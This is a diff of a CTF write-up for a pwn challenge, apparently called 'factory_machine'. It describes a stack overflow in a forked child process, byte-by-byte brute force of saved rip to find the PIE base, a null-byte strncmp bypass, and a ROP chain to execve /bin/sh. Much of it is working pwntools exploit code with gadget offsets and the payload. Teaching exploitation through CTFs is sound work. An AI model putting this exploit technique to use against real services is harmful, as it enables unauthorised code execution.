@@ -88,8 +88,13 @@ int __cdecl machine_main_demo(Machine *machine, void *arg)
 ### III. analyze
 - this is a CLI simulation chall, no libc statically linked, zero info leaks
 - there is only one overflow bug in `machine_main_demo()`. the child process reads from pipe until `\n`, allowing to overflow buf
-- `send <id> <msg>` w msg more than 0x118 bytes, it overflows and overwrite saved rbp and rip
+- `send <id> <msg>` w msg more than 0x118 bytes, it overflows and overwrite saved rbp and rip in child process
 ![](../image/factory_machine_2.png)
+- and look at `strncmp`, it will compare until `\00`. it means when we send `fail\x00` + `payload`, it still passes and print `failing ...` to pipe instead of `echo` and write `msg` to pipe
+![](../image/factory_machine_4.png)
+- and in `cli_recv`, if pipe is not empty (`ready >= 0`), it will read (`buf`) and bof bug will crash the program if garbage in pipe overflows stack of parent process
+![](../image/factory_machine_5.png)
+- to avoid this, we will use `recv(1, b'1000')` to consume this garbage
 - parent process spawns a child process (new machine) via `fork()` upon `start <id>` and communicates through 2 pipes (`send` and `recv`)
 - machine follows a lifecycle to set up and destroy: `start` -> `create` -> `stop` -> `cleanup` -> `deinit`(`UNUSED` -> `INITIALIZED` -> `RUNNING` -> `EXIT` -> `INITIALIZED` -> `UNUSED`)
 - sending msg other than `ping`, `fail`, `exit` triggers `echo[...]` print and ret2loop. sending `fail` or `exit` breaks loops and execv `ret`, triggering rop chain 
@@ -103,22 +108,23 @@ The child process is an exact duplicate of the parent process except for:
 Note the following further points:
      •  The child inherits copies of the parent's set of open file descriptors. Each file descriptor in the child refers to the same open file description (see open(2)) as the corresponding file descriptor in the parent. This means that the two file descriptors share open file status flags, file offset, and signal-driven I/O attributes (see the description of F_SETOWN and F_SETSIG in fcntl(2)).
 ```
-- it means that bc `fork()` duplicates parent's memory space, child inherits the exact ASLR/PIE layout. If child crashes, parent still survives, meaning PIE base remains static across attempts
-- `fork()` also duplicates all file descriptors (fd). if forget to explicitly `close(0)` (stdin) and `close(1)` (stdout) in the child process, both the parent CLI and newly spawned `/bin/sh` shell are concurrently listening, which causes i/o race condition
+- it means that bc `fork()` duplicates parent's memory space, child inherits the exact ASLR/PIE layout. if child crashes, parent still survives, meaning PIE base remains static across attempts
+- `fork()` also duplicates all file descriptors (fd). if forget to explicitly `close(0)` (stdin) and `close(1)` (stdout) in the child process, both the parent CLI and newly spawned `/bin/sh` shell are concurrently listening, which causes i/o race condition (though there's `close` in `machine_cleanup`, we got shell and couldnt use `cleanup` in CLI anymore)
 ```C
 rc = read_line_fd(machine->pipe[0], msg); // bof
 dprintf(machine->pipe[1], ...);
 // forget to close pipes
 ```
-- we can use `recv` to prevent parent and child process from fighting over data stream, for eg `recv(1, b'999999')`
+- we can use `recv` to prevent parent and child process from fighting over data stream, for eg `recv(1, b'999999')` in parent process
 - now we only need to find binary base and place rop chain in saved rip
 - w 2 `while` loops in `machine_main_demo()`, we will use bof to test each byte of saved rip to see whether it will exit either sucessully or w error
 - the goal is to set saved rip = `exit`, which is at `machine_start()`
 ![](../image/factory_machine_3.png)
-- and bc last 1.5 bytes is fixed, we will only need to brute force 4.5 bytes, and the 6th bytes usually ranges from 0x55 to 0x80, we will test this range first
+- and bc last 1.5 bytes is fixed, we will only need to brute force 4.5 bytes, and the 6th bytes usually ranges from 0x70 to 0x80, we will test this range first
+- and we use `monitor` to check whether machine exited
 
 -> overall, since we have a bof bug, cant leak addr but have some gadgets including `syscall`, the path will be:
-**blind rop (brop) via `fork()` to get binary base -> bof -> ret2syscall using ROP** 
+**brute force saved rip via `fork()` to get binary base -> bof -> ret2syscall using ROP** 
 ### IV. PoC
 ```Python
 #!/usr/bin/env python3
@@ -205,7 +211,7 @@ def brute_force():
     log.info("=== BRUTE FORCE ===")
     create(b"A"*8)
     start(0)
-    recv(0, b'1000')
+    recv(0, b'1000') # clean pipe
     
     target = [0x57]
     
@@ -213,12 +219,12 @@ def brute_force():
         if pos == 1:
             choices = [(n*16 + 0xb4) & 0xff for n in range(16)]
         elif pos == 5:
-            choices = list(range(0x55, 0x80)) + list(range(0, 0x55))
+            choices = list(range(0x70, 0x80)) + list(range(0, 0x70))
         else:
             choices = list(range(256))
             
         choices = [c for c in choices if c != 0x0a]
-        log.info(f"byte thứ {pos + 1}...")
+        log.info(f"byte {pos + 1}...")
         
         for choice in choices:
             if check(target, choice):
@@ -226,7 +232,7 @@ def brute_force():
                 log.success(f"-> byte {pos + 1} = 0x{choice:02x}")
                 break
         else:
-            log.error("failed")
+            log.error("failed")    
             sys.exit(1)
             
     pie_base = u64(bytes(target) + b'\x00'*2) - 0xb457
@@ -234,7 +240,7 @@ def brute_force():
     return pie_base
 
 def execv():
-    log.info("=== ROP === ")
+    log.info("=== ROP ===")
     # gadgets 
     syscall = 0x00000000000097f9 + exe.address
     pop_rdi_rbp = 0x000000000000c028 + exe.address
@@ -242,14 +248,12 @@ def execv():
     pop_rdx = 0x00000000000836dc + exe.address # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
     pop_rax = 0x0000000000040dcb + exe.address
     machine_addr = 0xc5a20 + exe.address
-    leave_ret = 0x0000000000009e8a + exe.address
     name = b'/bin/sh\x00'
     if args.GDB:
         gdbscript = f'''
         set follow-fork-mode child
         b*fork+73
         b*main+1022
-        b*{hex(leave_ret)}
         continue
         '''
         gdb.attach(p, gdbscript=gdbscript)
@@ -267,11 +271,9 @@ def execv():
         syscall
     )
 
-    send(1, b'A'*0x118 +payload)
-    send(1, b'fail')
+    sl(b'send 1 fail\x00' + b'A'*275 + payload + b'\nrecv 1 1000\nrecv 1 9999999')
     time.sleep(0.5)
-    sl(b'recv 1 9999999')
-    
+
 exe.address = brute_force()
 execv()
 
